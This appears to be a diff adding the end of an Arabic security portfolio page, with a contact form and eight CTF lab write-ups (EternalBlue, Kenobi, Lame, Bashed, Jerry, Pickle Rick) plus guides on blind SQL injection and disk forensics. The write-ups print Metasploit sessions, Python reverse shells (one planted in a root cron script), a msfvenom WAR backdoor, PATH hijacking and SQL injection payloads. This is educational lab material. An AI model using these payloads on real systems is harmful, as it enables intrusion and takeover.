+                            <input type="text" id="subject" name="subject" required placeholder="استفسار / تعاون أمني / مشروع">
+                        </div>
+                        <div class="form-group">
+                            <label for="message">الرسالة:</label>
+                            <textarea id="message" name="message" rows="5" required placeholder="اكتب رسالتك هنا..."></textarea>
+                        </div>
+                        <button type="submit" class="btn btn-primary btn-block" id="form-submit">
+                            إرسال الرسالة <i class="fa-solid fa-paper-plane"></i>
+                        </button>
+                        <div id="form-alert" class="form-alert"></div>
+                    </form>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- الفوتر -->
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-logo">Ft7y<span>.Sec</span></div>
+            <p>&copy; 2026 محمد فتحي (Mohamed Fathi). جميع الحقوق محفوظة.</p>
+            <div class="footer-links">
+                <a href="#home">الرئيسية</a>
+                <a href="pentest.html">اختبار الاختراق</a>
+                <a href="appsec.html">أمن التطبيقات</a>
+                <a href="automation.html">البرمجة والأتمتة</a>
+                <a href="systems-labs.html">الأنظمة والمعامل</a>
+                <a href="#ctf-writeups">CTF Write-ups</a>
+            </div>
+        </div>
+    </footer>
+
+    <!-- زر العودة للأعلى -->
+    <button id="back-to-top" class="back-to-top" title="العودة للأعلى">
+        <i class="fa-solid fa-chevron-up"></i>
+    </button>
+
+    <!-- إشعار النسخ -->
+    <div id="toast" class="toast"></div>
+
+    <noscript>
+        <div class="noscript-banner">لأفضل تجربة، فعّل JavaScript في المتصفح.</div>
+    </noscript>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.js"></script>
+    <script src="script.js"></script>
+
+
+    <!-- ====================================================
+         WRITEUP DETAIL MODALS (نوافذ عرض التقارير التفصيلية)
+         ==================================================== -->
+
+    <!-- Modal 1: Blue (TryHackMe) -->
+    <div class="wup-modal-overlay" id="modal-blue-thm" onclick="closeWriteupIfOutside(event, 'blue-thm')">
+        <div class="wup-modal" role="dialog" aria-modal="true" aria-labelledby="title-blue-thm">
+            <button class="wup-modal-close" onclick="closeWriteup('blue-thm')" aria-label="إغلاق النافذة">
+                <i class="fa-solid fa-xmark"></i>
+            </button>
+            <div class="wup-modal-header">
+                <div class="wup-modal-badges">
+                    <span class="platform-tag thm"><i class="fa-solid fa-fire"></i> TryHackMe</span>
+                    <span class="difficulty-badge easy">Easy</span>
+                    <span class="tag">#Windows7</span>
+                    <span class="tag">#MS17-010</span>
+                </div>
+                <h2 class="wup-modal-title" id="title-blue-thm">🪟 Blue — EternalBlue MS17-010 (CVE-2017-0143)</h2>
+                <div class="wup-modal-meta">
+                    <span><i class="fa-regular fa-calendar"></i> يناير 2025</span>
+                    <span><i class="fa-regular fa-clock"></i> وقت القراءة: 8 دقائق</span>
+                    <span><i class="fa-solid fa-user-shield"></i> إعداد: محمد فتحي (Ft7y.Sec)</span>
+                </div>
+            </div>
+            <div class="wup-modal-body">
+                <div class="wup-section">
+                    <h3><i class="fa-solid fa-circle-info"></i> ملخص العملية والهدف</h3>
+                    <p>
+                        غرفة <strong>Blue</strong> على TryHackMe تحاكي نظام Windows 7 غير محدث ومصاب بثغرة <strong>EternalBlue</strong> الشهيرة التي طورتها وكالة الأمن القومي الأمريكية (NSA) وسربتها مجموعة Shadow Brokers. الهدف هو استغلال الخلل في معالجة طلبات SMBv1 للوصول المباشر إلى أعلى صلاحيات بالنظام (SYSTEM).
+                    </p>
+                </div>
+
+                <div class="wup-section">
+                    <h3><i class="fa-solid fa-magnifying-glass"></i> المرحلة الأولى: الاستطلاع والفحص (Reconnaissance)</h3>
+                    <p>بدأنا بفحص المنافذ المفتوحة والخدمات مع تفعيل فحص الثغرات باستخدام محرك سكربتات Nmap (NSE):</p>
+                    <div class="wup-code-block">
+                        <div class="wup-code-header">
+                            <span>BASH — Nmap Vuln Scan</span>
+                            <button class="copy-cmd-btn" data-cmd="nmap -sV -sC -p 135,139,445 --script vuln 10.10.x.x">نسخ الأمر</button>
+                        </div>
+                        <pre><code>$ nmap -sV -sC -p 135,139,445 --script vuln 10.10.150.120
+
+PORT    STATE SERVICE      VERSION
+135/tcp open  msrpc        Microsoft Windows RPC
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Windows 7 Professional 7601 SP1
+
+Host script results:
+| smb-vuln-ms17-010:
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1.</code></pre>
+                    </div>
+                    <div class="wup-callout success">
+                        <i class="fa-solid fa-circle-check"></i>
+                        <span>تم التأكد بنسبة 100% أن المنفذ 445 مفتوح وخادم SMBv1 مصاب بالثغرة الحرجة CVE-2017-0143.</span>
+                    </div>
+                </div>
+
+                <div class="wup-section">
+                    <h3><i class="fa-solid fa-bolt"></i> المرحلة الثانية: الاستغلال (Exploitation via Metasploit)</h3>
+                    <p>استخدمنا وحدة الاستغلال الموثوقة داخل Metasploit Framework:</p>
+                    <div class="wup-code-block">
+                        <div class="wup-code-header">
+                            <span>MSFCONSOLE — Exploitation</span>
+                            <button class="copy-cmd-btn" data-cmd="use exploit/windows/smb/ms17_010_eternalblue&#10;set RHOSTS 10.10.150.120&#10;set LHOST tun0&#10;run">نسخ الأوامر</button>
+                        </div>
+                        <pre><code>msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.150.120
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST tun0
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+
+[*] Started reverse TCP handler on 10.14.30.55:4444 
+[*] 10.10.150.120:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.10.150.120:445 - Host is likely VULNERABLE to MS17-010!
+[*] 10.10.150.120:445 - Connecting to target for exploitation...
+[+] 10.10.150.120:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.150.120:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.150.120:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[*] Meterpreter session 1 opened (10.14.30.55:4444 -> 10.10.150.120:49175)</code></pre>
+                    </div>
+                </div>
+
+                <div class="wup-section">
+                    <h3><i class="fa-solid fa-trophy"></i> المرحلة الثالثة: جمع الأعلام (Loot & Flags)</h3>
+                    <div class="wup-code-block">
+                        <div class="wup-code-header"><span>METERPRETER — Verification</span></div>
+                        <pre><code>meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+
+meterpreter > shell
+C:\Windows\system32> dir C:\*flag*.txt /s /b
+C:\flag1.txt
+C:\Users\Jon\Desktop\flag3.txt
+C:\Windows\System32\config\flag2.txt</code></pre>
+                    </div>
+                    <div class="wup-flags-grid">
+                        <div class="flag-item">
+                            <span class="flag-name"><i class="fa-solid fa-flag"></i> Flag 1 (Root Dir)</span>
+                            <code>flag{access_the_machine}</code>
+                        </div>
+                        <div class="flag-item">
+                            <span class="flag-name"><i class="fa-solid fa-flag"></i> Flag 2 (SAM / Registry)</span>
+                            <code>flag{sam_database_harvested}</code>
+                        </div>
+                        <div class="flag-item">
+                            <span class="flag-name"><i class="fa-solid fa-flag"></i> Flag 3 (Desktop)</span>
+                            <code>flag{admin_has_fallen}</code>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="wup-section">
+                    <h3><i class="fa-solid fa-shield-halved"></i> سبل الحماية والتوصيات (Mitigation)</h3>
+                    <ul class="wup-checklist">
+                        <li><strong>تثبيت التحديث الأمني:</strong> تطبيق التحديث الأمني التراكمي Microsoft Security Bulletin MS17-010 فوراً.</li>
+                        <li><strong>تعطيل بروتوكول SMBv1:</strong> إيقاف بروتوكول SMB القديم تماماً عبر PowerShell: <code>Set-SmbServerConfiguration -EnableSMB1Protocol $false</code>.</li>
+                        <li><strong>حماية المنافذ بالشبكة:</strong> حظر المنفذين 139 و 445 من الشبكات الخارجية وجعلها مقتصرة فقط على بيئة الـ Active Directory الداخلية.</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal 2: Kenobi (TryHackMe) -->
+    <div class="wup-modal-overlay" id="modal-kenobi-thm" onclick="closeWriteupIfOutside(event, 'kenobi-thm')">
+        <div class="wup-modal" role="dialog" aria-modal="true" aria-labelledby="title-kenobi-thm">
+            <button class="wup-modal-close" onclick="closeWriteup('kenobi-thm')" aria-label="إغلاق النافذة">
+                <i class="fa-solid fa-xmark"></i>
+            </button>
+            <div class="wup-modal-header">
+                <div class="wup-modal-badges">
+                    <span class="platform-tag thm"><i class="fa-solid fa-fire"></i> TryHackMe</span>
+                    <span class="difficulty-badge easy">Easy</span>
+                    <span class="tag">#Linux</span>
+                    <span class="tag">#Samba</span>
+                    <span class="tag">#SUID</span>
+                </div>
+                <h2 class="wup-modal-title" id="title-kenobi-thm">🐧 Kenobi — Samba, ProFTPD 1.3.5 & SUID Path Hijacking</h2>
+                <div class="wup-modal-meta">
+                    <span><i class="fa-regular fa-calendar"></i> فبراير 2025</span>
+                    <span><i class="fa-regular fa-clock"></i> وقت القراءة: 10 دقائق</span>
+                    <span><i class="fa-solid fa-user-shield"></i> إعداد: محمد فتحي (Ft7y.Sec)</span>
+                </div>
+            </div>
+            <div class="wup-modal-body">
+                <div class="wup-section">
+                    <h3><i class="fa-solid fa-circle-info"></i> ملخص الآلة</h3>
+                    <p>
+                        آلة Linux تركز على التعداد العميق (Enumeration) لخدمات مشاركة الملفات، واستغلال ثغرة نقل الملفات في خادم ProFTPD للوصول إلى مفتاح SSH، متبوعة بترقية الصلاحيات من خلال تحليل ملف تنفيذي مصاب بـ SUID واستغلال متغيرات البيئة (PATH manipulation).
+                    </p>
+                </div>
+
+                <div class="wup-section">
+                    <h3><i class="fa-solid fa-magnifying-glass"></i> المرحلة الأولى: تعداد SMB و NFS</h3>
+                    <div class="wup-code-block">
+                        <div class="wup-code-header"><span>BASH — Enumeration</span><button class="copy-cmd-btn" data-cmd="smbclient //10.10.x.x/anonymous">نسخ</button></div>
+                        <pre><code># فحص مشاركات Samba
+$ smbclient -L //10.10.x.x/ -N
+Sharename       Type      Comment
+---------       ----      -------
+print$          Disk      Printer Drivers
+anonymous       Disk      
+IPC$            IPC       IPC Service
+
+# الدخول للمشاركة المجهولة وتحميل ملف السجل
+$ smbclient //10.10.x.x/anonymous
+smb: \> get log.txt
+# وجدنا في log.txt مسار مفتاح SSH للمستخدم: /home/kenobi/.ssh/id_rsa</code></pre>
+                    </div>
+                </div>
+
+                <div class="wup-section">
+                    <h3><i class="fa-solid fa-bolt"></i> المرحلة الثانية: استغلال ثغرة ProFTPD (CVE-2015-3306)</h3>
+                    <p>خدمة ProFTPD 1.3.5 تسمح بتنفيذ أوامر <code>SITE CPFR</code> و <code>SITE CPTO</code> بدون استيثاق:</p>
+                    <div class="wup-code-block">
+                        <div class="wup-code-header"><span>BASH — ProFTPD Copy Commands</span></div>
+                        <pre><code>$ nc 10.10.x.x 21
+220 ProFTPD 1.3.5 Server ready.
+SITE CPFR /home/kenobi/.ssh/id_rsa
+350 File or directory exists, ready for destination name
+SITE CPTO /var/tmp/id_rsa
+250 Copy successful
+
+# ربط مشاركة /var عبر NFS واستخراج المفتاح
+$ sudo mount 10.10.x.x:/var /mnt/kenobiNFS
+$ cp /mnt/kenobiNFS/tmp/id_rsa . && chmod 600 id_rsa
+$ ssh -i id_rsa kenobi@10.10.x.x
+kenobi@kenobi:~$ # تم الوصول للنظام بنجاح!</code></pre>
+                    </div>
+                </div>
+
+                <div class="wup-section">
+                    <h3><i class="fa-solid fa-arrow-up-right-dots"></i> المرحلة الثالثة: ترقية الصلاحيات (SUID Binary Hijacking)</h3>
+                    <p>بالبحث عن ملفات SUID وجدنا ملفاً غير اعتيادي باسم <code>/usr/bin/menu</code>:</p>
+                    <div class="wup-code-block">
+                        <div class="wup-code-header"><span>BASH — PrivEsc Path Injection</span></div>
+                        <pre><code># فحص الملف بواسطة strings
+kenobi@kenobi:~$ strings /usr/bin/menu
+curl -I localhost
+# لاحظ: يستدعي curl بدون المسار المطلق /usr/bin/curl !
+
+# التلاعب بمتغير PATH
+kenobi@kenobi:~$ cd /tmp
+kenobi@kenobi:/tmp$ echo "/bin/sh" > curl
+kenobi@kenobi:/tmp$ chmod +x curl
+kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
+kenobi@kenobi:/tmp$ /usr/bin/menu
+# تشغيل الخيار رقم 1
+# النتيجة:
+# id
+uid=0(root) gid=0(root) groups=0(root)</code></pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal 3: Lame (HackTheBox) -->
+    <div class="wup-modal-overlay" id="modal-lame-htb" onclick="closeWriteupIfOutside(event, 'lame-htb')">
+        <div class="wup-modal" role="dialog" aria-modal="true" aria-labelledby="title-lame-htb">
+            <button class="wup-modal-close" onclick="closeWriteup('lame-htb')" aria-label="إغلاق النافذة">
+                <i class="fa-solid fa-xmark"></i>
+            </button>
+            <div class="wup-modal-header">
+                <div class="wup-modal-badges">
+                    <span class="platform-tag htb"><i class="fa-solid fa-cube"></i> HackTheBox</span>
+                    <span class="difficulty-badge easy">Easy</span>
+                    <span class="tag">#Linux</span>
+                    <span class="tag">#CVE-2007-2447</span>
+                    <span class="tag">#RootShell</span>
+                </div>
+                <h2 class="wup-modal-title" id="title-lame-htb">🦁 Lame — Samba 3.0.20 usermap_script RCE</h2>
+                <div class="wup-modal-meta">
+                    <span><i class="fa-regular fa-calendar"></i> مارس 2025</span>
+                    <span><i class="fa-regular fa-clock"></i> وقت القراءة: 12 دقيقة</span>
+                    <span><i class="fa-solid fa-user-shield"></i> إعداد: محمد فتحي (Ft7y.Sec)</span>
+                </div>
+            </div>
+            <div class="wup-modal-body">
+                <div class="wup-section">
+                    <h3><i class="fa-solid fa-circle-info"></i> ملخص الآلة</h3>
+                    <p>
+                        تعتبر <strong>Lame</strong> أولى آلات منصة HackTheBox التاريخية، وتمثل نموذجاً واقعياً للخوادم التي تعمل بإصدارات Samba قديمة جداً مصابة بثغرة تنفيذ الأوامر عبر تمرير مدخلات خبيثة في خيار <code>username map script</code>.
+                    </p>
+                </div>
+                <div class="wup-section">
+                    <h3><i class="fa-solid fa-magnifying-glass"></i> الفحص والكشف</h3>
+                    <div class="wup-code-block">
+                        <div class="wup-code-header"><span>BASH — Nmap Service Scan</span></div>
+                        <pre><code>$ nmap -sV -sC -p 21,22,139,445 10.10.10.3
+
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 2.3.4 (Backdoor غير مفعل هنا)
+22/tcp  open  ssh         OpenSSH 4.7p1 Debian
+139/tcp open  netbios-ssn Samba smbd 3.0.20-Debian
+445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian</code></pre>
+                    </div>
+                </div>
+                <div class="wup-section">
+                    <h3><i class="fa-solid fa-bolt"></i> الاستغلال المباشر كـ Root</h3>
+                    <div class="wup-code-block">
+                        <div class="wup-code-header"><span>PYTHON / MSF — Exploit</span></div>
+                        <pre><code># الاستغلال عبر Metasploit
+msf6 > use exploit/multi/samba/usermap_script
+msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
+msf6 exploit(multi/samba/usermap_script) > set LHOST tun0
+msf6 exploit(multi/samba/usermap_script) > exploit
+
+[*] Command shell session 1 opened!
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+cat /home/makis/user.txt
+cat /root/root.txt</code></pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal 4: Bashed (HackTheBox) -->
+    <div class="wup-modal-overlay" id="modal-bashed-htb" onclick="closeWriteupIfOutside(event, 'bashed-htb')">
+        <div class="wup-modal" role="dialog" aria-modal="true" aria-labelledby="title-bashed-htb">
+            <button class="wup-modal-close" onclick="closeWriteup('bashed-htb')">
+                <i class="fa-solid fa-xmark"></i>
+            </button>
+            <div class="wup-modal-header">
+                <div class="wup-modal-badges">
+                    <span class="platform-tag htb"><i class="fa-solid fa-cube"></i> HackTheBox</span>
+                    <span class="difficulty-badge easy">Easy</span>
+                    <span class="tag">#Web</span>
+                    <span class="tag">#CronPrivEsc</span>
+                </div>
+                <h2 class="wup-modal-title" id="title-bashed-htb">💥 Bashed — phpbash Web Shell & Cron Job Exploitation</h2>
+            </div>
+            <div class="wup-modal-body">
+                <div class="wup-section">
+                    <h3>🔍 الاستكشاف والوصول الأولي</h3>
+                    <div class="wup-code-block">
+                        <div class="wup-code-header"><span>BASH — Gobuster Discovery</span></div>
+                        <pre><code>$ gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+/dev                  (Status: 301)
+/php                  (Status: 301)
+
+# عند تصفح /dev وجدنا phpbash.min.php يعطي Terminal داخل المتصفح!
+# قمنا بتشغيل Reverse Shell عبر Python:
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.x.x",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code></pre>
+                    </div>
+                </div>
+                <div class="wup-section">
+                    <h3>🔺 ترقية الصلاحيات عبر ملف test.py و Cron</h3>
+                    <div class="wup-code-block">
+                        <div class="wup-code-header"><span>BASH — Sudo & Cron PrivEsc</span></div>
+                        <pre><code>$ sudo -u scriptmanager bash
+# في المجلد /scripts وجدنا test.py ينفذه خادم cron بصلاحيات root كل دقيقة:
+$ echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.x.x',5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" > /scripts/test.py
+
+# بعد دقيقة واحدة استقبلنا اتصال Root Shell على المنفذ 5555!</code></pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal 5: Jerry (HackTheBox) -->
+    <div class="wup-modal-overlay" id="modal-jerry-htb" onclick="closeWriteupIfOutside(event, 'jerry-htb')">
+        <div class="wup-modal" role="dialog" aria-modal="true" aria-labelledby="title-jerry-htb">
+            <button class="wup-modal-close" onclick="closeWriteup('jerry-htb')">
+                <i class="fa-solid fa-xmark"></i>
+            </button>
+            <div class="wup-modal-header">
+                <div class="wup-modal-badges">
+                    <span class="platform-tag htb"><i class="fa-solid fa-cube"></i> HackTheBox</span>
+                    <span class="difficulty-badge easy">Easy</span>
+                    <span class="tag">#Tomcat</span>
+                    <span class="tag">#WAR</span>
+                </div>
+                <h2 class="wup-modal-title" id="title-jerry-htb">🐱 Jerry — Apache Tomcat WAR Backdoor Deployment</h2>
+            </div>
+            <div class="wup-modal-body">
+                <div class="wup-section">
+                    <h3>⚡ إنشاء ورفع الباكدور عبر Msfvenom</h3>
+                    <div class="wup-code-block">
+                        <div class="wup-code-header"><span>BASH — msfvenom WAR creation</span></div>
+                        <pre><code>$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=4444 -f war -o pwn.war
+
+# الدخول إلى http://10.10.10.95:8080/manager/html
+# بيانات تسجيل الدخول: tomcat : s3cret
+# رفع ملف pwn.war وتفعيله
+
+$ nc -lvnp 4444
+whoami
+nt authority\system</code></pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal 6: Pickle Rick (TryHackMe) -->
+    <div class="wup-modal-overlay" id="modal-picklerick-thm" onclick="closeWriteupIfOutside(event, 'picklerick-thm')">
+        <div class="wup-modal" role="dialog" aria-modal="true" aria-labelledby="title-picklerick-thm">
+            <button class="wup-modal-close" onclick="closeWriteup('picklerick-thm')">
+                <i class="fa-solid fa-xmark"></i>
+            </button>
+            <div class="wup-modal-header">
+                <div class="wup-modal-badges">
+                    <span class="platform-tag thm"><i class="fa-solid fa-fire"></i> TryHackMe</span>
+                    <span class="difficulty-badge easy">Easy</span>
+                    <span class="tag">#Web</span>
+                </div>
+                <h2 class="wup-modal-title" id="title-picklerick-thm">🥒 Pickle Rick — Command Injection & Filter Evasion</h2>
+            </div>
+            <div class="wup-modal-body">
+                <div class="wup-section">
+                    <h3>⚡ تخطي فلترة الأوامر وقراءة المكونات</h3>
+                    <div class="wup-code-block">
+                        <div class="wup-code-header"><span>BASH — Filter Bypass</span></div>
+                        <pre><code># أمر cat محظور من لوحة التحكم، استعضنا عنه بـ less و head:
+less "Sup3rS3cretPickl3Ingred.txt"     # المكون الأول: mr. meeseek hair
+less /home/rick/"second ingredients"   # المكون الثاني: 1 jerry tear
+sudo less /root/3rd.txt                # المكون الثالث: fleeb juice</code></pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal 7: Blind SQLi (Web Security) -->
+    <div class="wup-modal-overlay" id="modal-sqli-guide" onclick="closeWriteupIfOutside(event, 'sqli-guide')">
+        <div class="wup-modal" role="dialog" aria-modal="true" aria-labelledby="title-sqli-guide">
+            <button class="wup-modal-close" onclick="closeWriteup('sqli-guide')">
+                <i class="fa-solid fa-xmark"></i>
+            </button>
+            <div class="wup-modal-header">
+                <div class="wup-modal-badges">
+                    <span class="platform-tag web"><i class="fa-solid fa-globe"></i> Web Security</span>
+                    <span class="difficulty-badge medium">Medium</span>
+                </div>
+                <h2 class="wup-modal-title" id="title-sqli-guide">🗄️ دليل تحليل ثغرات Blind SQL Injection وطرق الوقاية</h2>
+            </div>
+            <div class="wup-modal-body">
+                <div class="wup-section">
+                    <h3>💡 آليات الحقن الأعمى (Boolean vs Time-Based)</h3>
+                    <div class="wup-code-block">
+                        <div class="wup-code-header"><span>SQL — Attack Payloads</span></div>
+                        <pre><code>-- Boolean-Based Injection
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
+
+-- Time-Based Injection (عند غياب أي فروق بصرية بالاستجابة)
+' AND IF(1=1, SLEEP(5), 0)--</code></pre>
+                    </div>
+                </div>
+                <div class="wup-section">
+                    <h3>🛡️ كود الحماية الآمن (Parameterized Queries)</h3>
+                    <div class="wup-code-block">
+                        <div class="wup-code-header"><span>PHP PDO — Safe Implementation</span></div>
+                        <pre><code>// الكود الآمن باستخدام الاستعلامات المجهزة
+$stmt = $pdo->prepare('SELECT id, name, email FROM users WHERE username = :user');
+$stmt->execute(['user' => $userInput]);
+$user = $stmt->fetch();</code></pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal 8: Forensics (HackerDNA) -->
+    <div class="wup-modal-overlay" id="modal-forensics-dfir" onclick="closeWriteupIfOutside(event, 'forensics-dfir')">
+        <div class="wup-modal" role="dialog" aria-modal="true" aria-labelledby="title-forensics-dfir">
+            <button class="wup-modal-close" onclick="closeWriteup('forensics-dfir')">
+                <i class="fa-solid fa-xmark"></i>
+            </button>
+            <div class="wup-modal-header">
+                <div class="wup-modal-badges">
+                    <span class="platform-tag hackerdna"><i class="fa-solid fa-dna"></i> HackerDNA</span>
+                    <span class="difficulty-badge easy">Easy</span>
+                </div>
+                <h2 class="wup-modal-title" id="title-forensics-dfir">🔍 الطب الشرعي الرقمي — استرداد وتحليل الأدلة من الـ Disk</h2>
+            </div>
+            <div class="wup-modal-body">
+                <div class="wup-section">
+                    <h3>🛠️ خطوات الفحص واستخراج الملفات</h3>
+                    <div class="wup-code-block">
+                        <div class="wup-code-header"><span>BASH — Autopsy & Binwalk</span></div>
+                        <pre><code># فحص التوقيع الرقمي واستخراج الأجزاء المخفية
+$ binwalk -e evidence.raw
+$ fls -r -p evidence.raw | grep -i deleted
+# استعادة الملف المحذوف عبر icat
+$ icat evidence.raw 142 > recovered_secret.docx</code></pre>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ==================================================== END WRITEUP DETAIL MODALS ==================================================== -->
+</body>
+
+</html>
